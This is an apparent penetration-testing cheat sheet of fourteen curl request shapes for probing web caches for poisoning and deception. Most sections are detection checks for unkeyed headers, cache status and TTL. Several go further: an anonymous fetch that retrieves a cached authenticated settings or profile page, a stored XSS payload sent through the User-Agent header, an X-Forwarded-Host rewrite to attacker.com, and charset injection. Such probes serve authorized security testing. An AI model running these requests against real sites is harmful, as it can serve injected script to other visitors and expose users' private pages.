# Request shapes — the poisoning probes, in one corpus

The complete set of request shapes that probe the cache surface.

---

## 1. The baseline probe — the cache-status check

```bash
# the cache status — a HIT/MISS/AGE header
curl -sI "$BASE/" | grep -iE 'x-cache|cf-cache|age:|via:|x-varnish|x-served-by|server'
#   X-Cache-Status: HIT/MISS — nginx; CF-Cache-Status — Cloudflare
```

## 2. The Vary probe — the key's discriminator

```bash
# the Vary header — which headers vary the cache
curl -sI "$BASE/" | grep -i 'vary'
#   Vary: Cookie → keyed on the cookie; (no Vary) → the headers unkeyed
```

## 3. The unkeyed-input probe — the poisoning request

```bash
# the unkeyed-input check — send it → check the stored copy
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'   # store it
curl "$BASE/page?cb=<unique>"   # a clean request — does it reflect <marker>?
```

## 4. The multi-input probe — the unkeyed sweep

```bash
# for each candidate input — send it → check the stored copy
for h in 'X-Forwarded-Host' 'X-Original-URL' 'User-Agent' 'Referer' 'Accept-Language' 'Accept-Charset' 'X-Forwarded-Scheme' 'X-Host' 'X-Real-IP' 'X-HTTP-Method-Override' 'X-Forwarded-Proto' 'X-Forwarded-Server'; do
  curl "$BASE/page?cb=<unique>" -H "$h: <marker>"
  curl "$BASE/page?cb=<unique>" | grep '<marker>' && echo "$h UNKEYED"
done
```

## 5. The cachebuster probe — a unique keyed param per probe

```bash
# a cachebuster — a unique key per probe — a confined blast
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'   # stored under /page?cb=<unique>
curl "$BASE/page?cb=<unique>"   # the stored copy serves it
curl "$BASE/page?cb=<other>"    # a different key — the clean copy
```

## 6. The deception probe — the privileged-page check

```bash
# an authenticated GET stores the privileged page
curl "$BASE/settings.html?cb=<unique>" -H 'Cookie: <auth>'   # stores the privileged copy
# an anonymous GET — the stored copy serves it
curl "$BASE/settings.html?cb=<unique>"   # the privileged page → deception
```

## 7. The personalized-page probe — the per-user leak

```bash
# a personalized GET stores YOUR session's content
curl "$BASE/profile?cb=<unique>" -H 'Cookie: <auth>'   # stores the personalized copy
# an anonymous GET — the stored copy serves YOUR session's content
curl "$BASE/profile?cb=<unique>"   # YOUR session's content → a per-user leak
```

## 8. The path-confusion probe — a normalization boundary

```bash
# a path the cache and the app normalize differently
curl "$BASE/static/../admin?cb=<unique>"   # the cache stores it under the static key
curl "$BASE/static/../admin?cb=<unique>"   # HIT? the stored copy's response is the app's
```

## 9. The HIT/MISS probe — the stored-copy confirm

```bash
# the stored copy's serve — a HIT confirms the stored copy
curl -sI "$BASE/page?cb=<unique>" | grep -iE 'x-cache|cf-cache|age'
#   X-Cache-Status: HIT → the stored copy served it
```

## 10. The TTL probe — the deception's persistence

```bash
# the stored copy's TTL — the Age + the max-age
curl -sI "$BASE/page?cb=<unique>" | grep -iE 'cache-control|age:|expires|max-age'
#   Age: 30 + max-age=300 → the copy is 30s old — 270s remain
```

## 11. The injected-content probe — the payload's store

```bash
# a reflected payload — the stored copy carries it
curl "$BASE/page?cb=<unique>" -H 'User-Agent: <script>alert(1)</script>'
curl "$BASE/page?cb=<unique>" | grep '<script>'   # the stored copy carries the XSS
```

## 12. The host-rewrite probe — the URL-rewrite

```bash
# an unkeyed X-Forwarded-Host — the app's links use YOUR host
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: attacker.com'
curl "$BASE/page?cb=<unique>" | grep 'attacker.com'   # the stored copy's links carry it
```

## 13. The charset probe — the charset injection

```bash
# an unkeyed reflected charset — an injected charset XSS stored
curl "$BASE/page?cb=<unique>" -H 'Accept-Charset: <payload>'
curl "$BASE/page?cb=<unique>" | grep '<payload>'   # the stored copy carries it
```

## 14. The falsifier probe — the keyed-input check

```bash
# the keyed-input check — does the clean request reflect?
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'   # store it
curl "$BASE/page?cb=<unique>"   # a clean request — does it reflect <marker>?
#   reflected → unkeyed → poisonable; NOT reflected → keyed → a different class
```
